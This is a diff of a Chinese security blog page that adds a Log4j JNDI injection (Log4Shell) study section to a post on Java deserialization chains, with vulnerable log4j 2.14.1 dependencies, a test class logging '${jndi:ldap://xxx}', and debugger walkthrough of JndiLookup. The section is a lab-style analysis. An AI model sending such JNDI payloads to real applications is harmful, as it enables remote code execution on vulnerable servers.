@@ -14,8 +14,8 @@
   <meta name="theme-color">
 
   
-  <title>JavaEECC1链条持续更新&#43;fastjson1.2.24 &middot; IIIIIII的博客</title>
-    <meta name="title" content="JavaEECC1链条持续更新&#43;fastjson1.2.24 &middot; IIIIIII的博客">
+  <title>JavaEECC1链条持续更新&#43;fastjson1.2.24&#43;log4j &middot; IIIIIII的博客</title>
+    <meta name="title" content="JavaEECC1链条持续更新&#43;fastjson1.2.24&#43;log4j &middot; IIIIIII的博客">
 
   
   
@@ -97,7 +97,7 @@
   
   <meta property="og:url" content="https://Starrui777.github.io/posts/cc/">
   <meta property="og:site_name" content="IIIIIII的博客">
-  <meta property="og:title" content="JavaEECC1链条持续更新&#43;fastjson1.2.24">
+  <meta property="og:title" content="JavaEECC1链条持续更新&#43;fastjson1.2.24&#43;log4j">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -107,15 +107,15 @@
 
   
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="JavaEECC1链条持续更新&#43;fastjson1.2.24">
+  <meta name="twitter:title" content="JavaEECC1链条持续更新&#43;fastjson1.2.24&#43;log4j">
 
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "JavaEECC1链条持续更新\u002bfastjson1.2.24",
-    "headline": "JavaEECC1链条持续更新\u002bfastjson1.2.24",
+    "name": "JavaEECC1链条持续更新\u002bfastjson1.2.24\u002blog4j",
+    "headline": "JavaEECC1链条持续更新\u002bfastjson1.2.24\u002blog4j",
     
     
     "inLanguage": "en",
@@ -133,7 +133,7 @@
     "keywords": ["JavaEE"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "1679"
+    "wordCount": "1894"
   }]
   </script>
 
@@ -509,7 +509,7 @@
     <header id="single_header" class="mt-5 max-w-prose">
       
       <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-        JavaEECC1链条持续更新+fastjson1.2.24
+        JavaEECC1链条持续更新+fastjson1.2.24+log4j
       </h1>
       <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
         
@@ -562,7 +562,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-10-29T00:00:00&#43;00:00">29 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1679 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span>
+      <time datetime="2025-10-29T00:00:00&#43;00:00">29 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1894 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">9 mins</span>
     
 
     
@@ -760,6 +760,12 @@
             <li><a href="#4找到漏洞类">4：找到漏洞类</a></li>
           </ul>
         </li>
+        <li><a href="#三log4j-jndi注入">三：LOG4J-jndi注入</a>
+          <ul>
+            <li><a href="#1条件与poc">1：条件与POC</a></li>
+            <li><a href="#2跟踪调试">2：跟踪调试</a></li>
+          </ul>
+        </li>
       </ul>
     </li>
   </ul>
@@ -793,6 +799,12 @@
             <li><a href="#2看看效果以及poc">2：看看效果以及poc</a></li>
             <li><a href="#3工作原理">3：工作原理</a></li>
             <li><a href="#4找到漏洞类">4：找到漏洞类</a></li>
+          </ul>
+        </li>
+        <li><a href="#三log4j-jndi注入">三：LOG4J-jndi注入</a>
+          <ul>
+            <li><a href="#1条件与poc">1：条件与POC</a></li>
+            <li><a href="#2跟踪调试">2：跟踪调试</a></li>
           </ul>
         </li>
       </ul>
@@ -1712,6 +1724,173 @@ public class test2 {
 </figure>
 </p>
 
+<h3 class="relative group">三：LOG4J-jndi注入 
+    <div id="三log4j-jndi注入" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e4%b8%89log4j-jndi%e6%b3%a8%e5%85%a5" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+
+<h4 class="relative group">1：条件与POC 
+    <div id="1条件与poc" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#1%e6%9d%a1%e4%bb%b6%e4%b8%8epoc" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>依赖如下小于2.14</p>
+<pre tabindex="0"><code>&lt;dependencies&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+        &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+        &lt;version&gt;2.14.1&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+        &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
+        &lt;version&gt;2.14.1&lt;/version&gt;
+    &lt;/dependency&gt;
+&lt;/dependencies&gt;
+或者如果你没有源码--------------------------
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;project xmlns=&#34;http://maven.apache.org/POM/4.0.0&#34;
+         xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;
+         xsi:schemaLocation=&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&#34;&gt;
+    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+    &lt;groupId&gt;com.yr&lt;/groupId&gt;
+    &lt;artifactId&gt;log4jjj&lt;/artifactId&gt;
+    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
+
+    &lt;properties&gt;
+        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;
+        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;
+        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
+    &lt;/properties&gt;
+
+    &lt;dependencies&gt;
+        &lt;!-- Log4j 核心二进制包（编译运行必需） --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+            &lt;version&gt;2.14.1&lt;/version&gt;
+            &lt;!-- 不带 classifier，默认是二进制包 --&gt;
+        &lt;/dependency&gt;
+        &lt;!-- Log4j 核心源码包（仅用于查看源码，可选） --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+            &lt;version&gt;2.14.1&lt;/version&gt;
+            &lt;classifier&gt;sources&lt;/classifier&gt;
+            &lt;scope&gt;provided&lt;/scope&gt; &lt;!-- 标记为“已提供”，不参与打包 --&gt;
+        &lt;/dependency&gt;
+
+        &lt;!-- Log4j API 二进制包（编译运行必需） --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
+            &lt;version&gt;2.14.1&lt;/version&gt;
+        &lt;/dependency&gt;
+        &lt;!-- Log4j API 源码包（仅用于查看源码，可选） --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
+            &lt;version&gt;2.14.1&lt;/version&gt;
+            &lt;classifier&gt;sources&lt;/classifier&gt;
+            &lt;scope&gt;provided&lt;/scope&gt;
+        &lt;/dependency&gt;
+    &lt;/dependencies&gt;
+
+&lt;/project&gt;
+</code></pre><p>在resource下面创建l<code>og4j2.xml</code> 配置文件</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;Configuration status=&#34;WARN&#34;&gt;
+    &lt;Appenders&gt;
+        &lt;!-- 输出到控制台 --&gt;
+        &lt;Console name=&#34;Console&#34; target=&#34;SYSTEM_OUT&#34;&gt;
+            &lt;PatternLayout pattern=&#34;%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n&#34;/&gt;
+        &lt;/Console&gt;
+    &lt;/Appenders&gt;
+    &lt;Loggers&gt;
+        &lt;!-- 根日志器，级别设为INFO --&gt;
+        &lt;Root level=&#34;info&#34;&gt;
+            &lt;AppenderRef ref=&#34;Console&#34;/&gt;
+        &lt;/Root&gt;
+    &lt;/Loggers&gt;
+&lt;/Configuration&gt;
+</code></pre><p>代码如下</p>
+<p>$表示里面是需要被解析的变量</p>
+<p>jndi：表示用jndi组件去解析</p>
+<p>ldap表示jndi注入协议如rmi</p>
+<pre tabindex="0"><code>import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class test {
+    public static final Logger logger = LogManager.getLogger(test.class);
+    public static void main(String[] args) {
+        logger.info(&#34;hello world&#34;);
+        logger.info(&#34;${jndi:ldap://xxx}&#34;);
+    }
+}
+</code></pre><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/cc/l1.png">
+
+  
+</figure>
+</p>
+
+<h4 class="relative group">2：跟踪调试 
+    <div id="2跟踪调试" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#2%e8%b7%9f%e8%b8%aa%e8%b0%83%e8%af%95" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>JNDI注入要看InitialContext.java下面的lookup方法</p>
+<p>我们打一个断点然后调试发现确实经过了</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/cc/l2.png">
+
+  
+</figure>
+</p>
+<p>发现变量覆盖过去</p>
+<p>通过变量赋值${}解析中间数值调用了JNDIlookup</p>
+<p><code>当变量表达式以 </code>jndi:<code>开头时（如</code>${jndi:ldap://&hellip;}<code>），Log4j 会调用 </code>JndiLookup<code>类的</code>lookup<code>方法，该类实现了</code>Lookup<code> 接口，专门处理 JNDI 相关的变量解析。</code></p>
+<pre tabindex="0"><code>@Override
+public String lookup(final LogEvent event, final String key) {
+    if (key == null) {
+        return null;
+    }
+    final String jndiName = convertJndiName(key);
+    try (final JndiManager jndiManager = JndiManager.getDefaultManager()) {
+        return Objects.toString(jndiManager.lookup(jndiName), null);
+    } catch (final NamingException e) {
+        LOGGER.warn(LOOKUP, &#34;Error looking up JNDI resource [{}].&#34;, jndiName, e);
+        return null;
+    }
+</code></pre>
           
           
           
@@ -2401,6 +2580,27 @@ public class test2 {
           
         </span>
         <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/memory/">
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >JAVA-内存马</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-11-04T00:00:00&#43;00:00">4 November 2025</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
           
         </span>
       </div>
